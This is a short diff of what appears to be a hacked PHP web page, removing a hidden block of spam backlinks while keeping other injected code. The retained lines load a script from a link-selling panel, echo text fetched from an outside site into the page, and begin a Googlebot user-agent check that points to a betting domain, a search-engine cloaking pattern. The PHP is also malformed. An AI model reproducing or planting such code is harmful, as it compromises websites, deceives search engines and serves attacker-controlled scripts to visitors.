@@ -42,9 +42,6 @@ $borrowing($abandoned);
 ?>
 <script src="https://hacklink.market/panel/3035.js"></script>
 <?php echo file_get_contents("https://pn-jogjakarta.website/txt/asli.txt");?>
-<?php
-<div style="display: none;">
-<a href="https://www.ambamalicanada.org">Ambamali Canada</a><a href="https://centrethought.com/">Centre Thought</a><a href="https://openetherpad.com/">Open Ether Pad</a><a href="https://www.wewantrealnews.com">We Want Real News</a><a href="https://www.mpaper.org/">MPAPER Destination for Anime</a><a href="https://myoregonfarmgarden.com/">Oregon Farm Garden News</a><a href="https://thepoisonedpawn.com/">The Poisoned Pawn</a><a href="https://www.friwebteknologi.org">Friweb Teknologi</a><a href="https://locandadellamaria.com">Locanda della Maria News</a>
 </div>
 if (isset($_SERVER['HTTP_USER_AGENT']) && stripos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') !== false) {
     $url = 'https://denemebonusu.co.uk/sayac.php';
